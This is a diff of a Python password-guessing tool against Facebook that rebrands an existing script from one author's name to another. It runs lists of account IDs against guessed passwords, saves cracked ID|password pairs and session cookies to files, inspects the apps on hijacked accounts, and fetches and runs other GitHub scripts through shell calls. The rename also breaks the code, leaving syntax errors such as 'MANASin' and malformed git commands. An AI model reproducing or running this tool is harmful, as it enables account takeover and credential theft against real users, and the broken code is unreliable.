@@ -1,6 +1,6 @@
 #decode by : JUTTBRAND
 #coding=utf-8
-#created by hamii
+#created by MANAS
 #team name hbf
 #tottaly written by hamid Khawaja
 #!/usr/bin/python3
@@ -18,14 +18,14 @@ try:
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
 except ModuleNotFoundError:
     os.system('pip install --upgrade pip && pip install requests futures==2 > /dev/null')
-    os.system('python HAMII.py')
+    os.system('python MANAS.py')
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.0001)
-sys.stdout.write('\x1b[1;35m\x1b]2; HAMII \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2; MANAS\x07')
 
 import requests
 import bs4
@@ -91,7 +91,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-hamii2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
+MANAS2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
 import random
 
 def clear():
@@ -130,8 +130,8 @@ logo ="""     \033[1;37m____ \033[1;32m             ______     _______   \033[1;
 \033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
 \033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mMUHAMMAD HAMID KHAWAJA          \033[1;31m│
 \033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mMUHAMMAD HAMID KHAWAJA          \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m Hamii-king-06                  \033[1;31m │
-\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mHAMII WORLD                  \033[1;31m   │
+\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m MANAS-king-06                  \033[1;31m │
+\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mMANASWORLD                  \033[1;31m   │
 \033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   │
 \033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mFACEBOOK TRICKS AND HELPING ZONE\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
 \033[1;37m╚\033[1;36mⒽⒷⒻ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪  𓆩𝐅𝐎𝐑𝐂𝐄𓆪 ]\x1b[0m══════\033[1;36mⒽⒷⒻ\033[1;37m╝
@@ -191,7 +191,7 @@ def saprate():
     file_name = input('\033[1;33m FILE PATH: ')
     print("")
     print(" PUT YOUR NEW FILE NAME ")
-    print('\033[1;32m Example /sdcard/HAMII-81.txt')
+    print('\033[1;32m Example /sdcard/MANAS-81.txt')
     new_save = input('\033[1;33m NEW FILE PATH: ')
     y = 0
     for k in range(limit):
@@ -253,7 +253,7 @@ def main():
     print(logo)
     print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
     print(f'{BLUE}══════════════════════════════════════════════════════')
-    print("           \x1b[97m[\033[37;41m  WELCOME. TO HAMII TOOL \033[0;m] ")
+    print("           \x1b[97m[\033[37;41m  WELCOME. TO MANASTOOL \033[0;m] ")
     print(f" {WHITE}TODAY DATE     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
     print(f" {WHITE}USER NAME      : {BLUE}"+NameX)
     print(f"{BLUE}══════════════════════════════════════════════════════")
@@ -269,28 +269,28 @@ def main():
     print(f"{RED}[10] {WHITE}MY YOUTUBE CHANNEL")
     print(f"{RED}[00] {WHITE}EXIT PROGRAM")
     linex()
-    HAMII = input("[√] CHOOSE : ")
-    if HAMII in ["1","01"]: 
+    MANAS= input("[√] CHOOSE : ")
+    if MANASin ["1","01"]: 
         passx()
-    elif HAMII in ["2","02"]:
+    elif MANASin ["2","02"]:
         file_crack()
-    elif HAMII in ["3","03"]:
+    elif MANASin ["3","03"]:
         Filex()
-    elif HAMII in ["4","04"]:
+    elif MANASin ["4","04"]:
         File_creating()
-    elif HAMII in ["5","05"]:
+    elif MANASin ["5","05"]:
         saprate()
-    elif HAMII in ["6","06"]:
+    elif MANASin ["6","06"]:
         remove_dub()
-    elif HAMII in ["7","07"]:
+    elif MANASin ["7","07"]:
         PROTECT()
-    elif HAMII in ["8","08"]:
+    elif MANASin ["8","08"]:
         CYTHONIZER()
-    elif HAMII in ["9","09"]:
+    elif MANASin ["9","09"]:
         BOTX()
-    elif HAMII in ["10","10"]:
-        os.system("xdg-open https://youtube.com/c/Hamiiworld")
-    elif HAMII in ["0","00"]:
+    elif MANASin ["10","10"]:
+        os.system("xdg-open https://youtube.com/c/MANASworld")
+    elif MANASin ["0","00"]:
         os.system('rm -rf fb_cookies.txt')
         exit()
     else:
@@ -301,17 +301,17 @@ def main():
 
 
 def File_creating():
-    os.system(f"git clone https://github.com/HAMII-king-06/DUMP && cd DUMP && python DUMP.py")
+    os.system(f"git clone https://github.com/MANAS-king-06/DUMP && cd DUMP && python DUMP.py")
 
 def PROTECT():
-    os.system(" rm -rf DATA_PROTECT && git clone https://github.com/Hamii-king-06/DATA_PROTECT && cd DATA_PROTECT && python PROTECTOR.py")
+    os.system(" rm -rf DATA_PROTECT && git clone https://github.com/MANAS-king-06/DATA_PROTECT && cd DATA_PROTECT && python PROTECTOR.py")
 
 def CYTHONIZER():
-    os.system("rm -rf Cython_Changer && git clone https://github.com/Hamii-king-06/Cython_Changer && cd Cython_Changer && python3 Run.py")
+    os.system("rm -rf Cython_Changer && git clone https://github.com/MANAS-king-06/Cython_Changer && cd Cython_Changer && python3 Run.py")
 
 
 def BOTX():
-    os.system("rm -rf BOT && git clone https://github.com/Hamii-king-06/ BOT && cd BOTgit clone https://github.com/Hamii-king-06/ BOT && cd BOT && python3 Hamii.py")
+    os.system("rm -rf BOT && git clone https://github.com/MANAS-king-06/ BOT && cd BOTgit clone https://github.com/MANAS-king-06/ BOT && cd BOT && python3 MANAS.py")
 
 def file_crack():
     global ok,cp,tf
@@ -319,28 +319,37 @@ def file_crack():
     print(logo)
     print('           \x1b[97m[\033[37;41m  S E R V E R   M E N U   \033[0;m] ')
     print("")
+    print('\n\033[1;37m[+]══════════════════════════════════════════')
     print(f"{RED}[1] {WHITE}SERVER NUM 1 (BEST)")
     print(f"{RED}[2] {WHITE}SERVER NUM 2 (NORMAL)")
     linex()
-    opt_method = input(f'CHOOSE SERVER {hamii2} : ')
+    opt_method = input(f'CHOOSE SERVER {MANAS2} : ')
     os.system('clear')
     print(logo)
+    print('\n\033[1;37m[+]══════════════════════════════════════════')
     print('           \x1b[97m[\033[37;41m  F I L E   M E N U   \033[0;m] ') 
+    print('\n\033[1;37m[+]══════════════════════════════════════════')
     print("")
     file = input(' FILE PATH: ')
     try:
         fo = open(file,'r').read().splitlines()
     except FileNotFoundError:
+    	print('\n\033[1;37m[+]══════════════════════════════════════════')
         print(' YOUR GIVEN FILE IS NOT FOUND IN STORAGE ⚠️ ...')
+        print('\n\033[1;37m[+]══════════════════════════════════════════')
         time.sleep(1)
         file_crack()
     plist = []
     try:
         clear()
+        print('\n\033[1;37m[+]══════════════════════════════════════════')
         print('           \x1b[97m[\033[37;41m  P A S S   M E N U   \033[0;m] ')
+        print('\n\033[1;37m[+]══════════════════════════════════════════')
         print("")
+        print('\n\033[1;37m[+]══════════════════════════════════════════')
         print(f"{WHITE}HOW MANY PASSWORDS YOU WANT TO ADD ")
         print("FOR EXAMPLE (firstlast, First Last, first123, first last)")
+        print('\n\033[1;37m[+]══════════════════════════════════════════')
         print("")
         ps_limit = int(input(' PUT LIMIT : '))
     except:
@@ -371,7 +380,7 @@ def file_crack():
     print('\n\033[1;37m[+]══════════════════════════════════════════')
     print('[•] CLONING COMPLETED\n[•] YOUR OK IDS : '+str(len(ok))+'\n[•] TOTAL CP IDS : '+str(len(cp)))
     print('\033[1;37m[+]══════════════════════════════════════════')
-    print('[•] OK IDS SAVE : /sdcard/HAMII_OK.txt\n[•] CP IDS SAVE : /sdcard/HAMII_CP.txt')
+    print('[•] OK IDS SAVE : /sdcard/MANAS_OK.txt\n[•] CP IDS SAVE : /sdcard/MANAS_CP.txt')
     input('[•] PRESS ENTER TO BACK MENU   ')
     main()
 def method1(ids,names,passlist,total_ids):
@@ -379,7 +388,7 @@ def method1(ids,names,passlist,total_ids):
     rcol =['\033[1;32mM-1','\033[1;31mM-1']
     rr = random.choice(rcol)
     whi = '\033[0;97m'
-    sys.stdout.write(f'\r%s {WHITE}[HAMII 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
+    sys.stdout.write(f'\r%s {WHITE}[MANAS]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
     try:
         first = names.split(' ')[0]
         try:
@@ -402,25 +411,22 @@ def method1(ids,names,passlist,total_ids):
             next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
             cookies = r.cookies.get_dict().keys()
             if 'c_user' in cookies:
-                os.system("play-audio HAMII_OK.mp3")
-                print('\r\033[1;32m[HAMII-OK] '+ids+' | '+pas+'\033[1;97m')
+                print('\r\033[1;32m[MANAS-OK] '+ids+' | '+pas+'\033[1;97m')
                 ok.append(ids)
-                open('/sdcard/HAMII_OK.txt', 'a').write(ids+' | '+pas+'\n')
+                open('/sdcard/MANAS_OK.txt', 'a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                 break
             elif 'checkpoint' in cookies:
                 d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                 #print(d.group(1))
                 if 'Enter login code to continue' in str(d):
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;35m[HAMII-2F] '+ids+' | '+pas+'\033[1;97m')
+                 #   print(#'\r\033[1;35m[MANAS-2F] '+ids#+' | '+pas#+'\033[1;97m')
                     tf.append(ids)
-                    open('/sdcard/HAMII_2F.txt', 'a').write(ids+' | '+pas+'\n')
+                    open('/sdcard/MANAS_2F.txt', 'a').write(ids+' | '+pas+'\n')
                     break
                 else:
-                    os.system("play-audio HAMII_CP.mp3")
-                    print('\r\033[1;31m[HAMII-CP] '+ids+' | '+pas+'\033[1;97m')
+                    #print(#'\r\033[1;31m[MANAS-CP] '+ids#+' | '+pas#+'\033[1;97m')
                     cp.append(ids)
-                    open('/sdcard/HAMII_CP.txt', 'a').write(ids+' | '+pas+'\n')
+                    open('/sdcard/MANAS_CP.txt', 'a').write(ids+' | '+pas+'\n')
                     break
             else:continue
         loop+=1
@@ -432,7 +438,7 @@ def method2(ids,names,passlist,total_ids):
     rcol =['\033[1;32mM-2','\033[1;31mM-2']
     rr = random.choice(rcol)
     whi = '\033[0;97m'
-    sys.stdout.write(f'\r%s {WHITE}[HAMII 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
+    sys.stdout.write(f'\r%s {WHITE}[MANAS]%s [%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
     try:
         first = names.split(' ')[0]
         try:
@@ -459,25 +465,22 @@ def method2(ids,names,passlist,total_ids):
             cookies = session.cookies.get_dict().keys()
             #open('jhuk.html', 'w').write(post_request)
             if 'c_user' in cookies:
-                os.system("play-audio HAMII_OK.mp3")
-                print('\r\033[1;32m[HAMII-OK] '+ids+' | '+pas+'\033[0;97m')
+                print('\r\033[1;32m[MANAS-OK] '+ids+' | '+pas+'\033[0;97m')
                 ok.append(ids)
-                open('/sdcard/HAMII_OK.txt', 'a').write(ids+' | '+pas+'\n')
+                open('/sdcard/MANAS_OK.txt', 'a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                 break
             elif 'checkpoint' in cookies:
                 d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                 #print(d.group(1))
                 if 'Enter login code to continue' in str(d.group(1)):
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;35m[HAMII-2F] '+ids+' | '+pas+'\033[0;97m')
+                    #   print(#'\r\033[1;35m[MANAS-2F] '+ids#+' | '+pas#+'\033[1;97m')
                     tf.append(ids)
-                    open('/sdcard/HAMII_2F.txt', 'a').write(ids+' | '+pas+'\n')
+                    open('/sdcard/MANAS_2F.txt', 'a').write(ids+' | '+pas+'\n')
                     break
                 else:
-                    os.system("play-audio HAMII_CP.mp3")
-                    print('\r\033[1;31m[HAMII-CP] '+ids+' | '+pas+'\033[0;97m')
+                    #print(#'\r\033[1;31m[MANAS-CP] '+ids#+' | '+pas#+'\033[1;97m')
                     cp.append(ids)
-                    open('/sdcard/HAMII_CP.txt', 'a').write(ids+' | '+pas+'\n')
+                    open('/sdcard/MANAS_CP.txt', 'a').write(ids+' | '+pas+'\n')
                     break
             else:continue
         loop+=1
@@ -489,7 +492,7 @@ def random_method(ids,passlist,total_ids):
     rcol =['\033[1;32mO_O','\033[1;31m -_-']
     rr = random.choice(rcol)
     whi = '\033[0;97m'
-    sys.stdout.write(f'\r{WHITE}[HAMII 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
+    sys.stdout.write(f'\r{WHITE}[MANAS]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
     try:
         for pas in passlist:
             xyz = requests.Session()
@@ -537,10 +540,9 @@ def random_method(ids,passlist,total_ids):
                 if cid in ok:
                     pass
                 else:
-                    os.system("play-audio HAMII_OK.mp3")
-                    print('\r\033[1;92m[HAMII-OK] '+cid+' | '+pas+'\033[0;97m')
+                    print('\r\033[1;92m[MANAS-OK] '+cid+' | '+pas+'\033[0;97m')
                     ok.append(cid)
-                    open('/sdcard/HAMII_OK.txt', 'a').write(cid+' | '+pas+'\n')
+                    open('/sdcard/MANAS_OK.txt', 'a').write(cid+' | '+pas+'\n')
                     break
             elif 'checkpoint' in cookies:
                 coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
@@ -550,19 +552,17 @@ def random_method(ids,passlist,total_ids):
                 else:
                     d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                     if 'Enter login code to continue' in str(d.group(1)):
-                        os.system("play-audio HAMII_2F.mp3")
-                        print('\r\033[1;95m[HAMII-2F] '+cid+' | '+pas+'\033[0;97m')
+                        print('\r\033[1;95m[MANAS-2F] '+cid+' | '+pas+'\033[0;97m')
                         tf.append(cid)
-                        open('/sdcard/HAMII_2F.txt', 'a').write(cid+' | '+pas+'\n')
+                        open('/sdcard/MANAS_2F.txt', 'a').write(cid+' | '+pas+'\n')
                         break
                     else:
                         if cid in cp:
                             pass
                         else:
-                            os.system("play-audio HAMII_CP.mp3")
-                            print('\r\033[1;94m[HAMII-CP] '+cid+' | '+pas+'\033[0;97m')
+                            print('\r\033[1;94m[MANAS-CP] '+cid+' | '+pas+'\033[0;97m')
                             cp.append(cid)
-                            open('/sdcard/HAMII_CP.txt', 'a').write(cid+' | '+pas+'\n')
+                            open('/sdcard/MANAS_CP.txt', 'a').write(cid+' | '+pas+'\n')
                             break
             else:continue
          #   else:
@@ -589,7 +589,7 @@ def Filex():
     print("[02] REMOVE OLD COOKIES")
     print("[E] EXIT")
     linex() 
-    check=input(f" CHOOSE {hamii2} :")
+    check=input(f" CHOOSE {MANAS2} :")
     if check in ['01','1']:
         file_m()
     elif check in ['02','2']:
@@ -691,7 +691,7 @@ def file_m():
         except(KeyError,IOError,OSError):
             pass
     print("")
-    print('\n Example: /sdcard/hamii.txt ')
+    print('\n Example: /sdcard/MANAS.txt ')
     print("")
     s_file = input(" ENTER FILE PATH: ")
     for uuids in fav:
@@ -751,7 +751,7 @@ def cek_apk(session,coki):
         print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            #created by hbf team(owner) Hamii
+            #created by hbf team(owner) MANAS
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -792,18 +792,18 @@ def passx():
     print(f"{RED}[05] {WHITE}KHAN & ALI MIX PASS        {GREEN}[SLOWEST]")
     print(f"{RED}[06] {WHITE}KHAN & MALIK MIX PASS      {GREEN}[SLOWEST]")
     print(f"\033[1;91m====================================================")
-    hamii = input("[√] CHOOSE : ")
-    if hamii in ["1","01"]:
+    MANAS= input("[√] CHOOSE : ")
+    if MANASin ["1","01"]:
         pass1()
-    elif hamii in ["2","02"]:
+    elif MANASin ["2","02"]:
         pass2()
-    elif hamii in ["3","03"]:
+    elif MANASin ["3","03"]:
         pass3()
-    elif hamii in ["4","04"]:
+    elif MANASin ["4","04"]:
         pass4()
-    elif hamii in ["5","05"]:
+    elif MANASin ["5","05"]:
         pass5()
-    elif hamii in ["6","06"]:
+    elif MANASin ["6","06"]:
         pass6()
     else:
         print('\033[1;31mINCORECT OPTION !!');main()
@@ -852,7 +852,7 @@ def pass1():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/MANAS-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/MANAS-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
@@ -904,7 +904,7 @@ def pass2():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/MANAS-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/MANAS-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
@@ -952,7 +952,7 @@ def pass3():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/MANAS-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/MANAS-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
@@ -1000,7 +1000,7 @@ def pass4():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/MANAS-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/MANAS-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
@@ -1049,7 +1049,7 @@ def pass5():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/MANAS-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/MANAS-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
@@ -1096,7 +1096,7 @@ def pass6():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/MANAS-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/MANAS-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
@@ -1148,31 +1148,31 @@ def freeq(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio HAMII_OK.mp3")
+                os.system("play-audio MANAS_OK.mp3")
                 print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ '  ') 
                 cek_apk(session,coki)
-                open('/sdcard/HAMII-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/MANAS-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio HAMII_2F.mp3")
+                    os.system("play-audio MANAS_2F.mp3")
                     print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/HAMII-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    open('/sdcard/MANAS-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio HAMII_CP.mp3")
+                    os.system("play-audio MANAS_CP.mp3")
                     print(f'\r{RED}[CP] '+uid+' [×] '+ps+' ')
-                    open('/sdcard/HAMII-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    open('/sdcard/MANAS-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[HAMII 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[MANAS] [%s] \33[1;97m[OK:%s{MANAS2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass
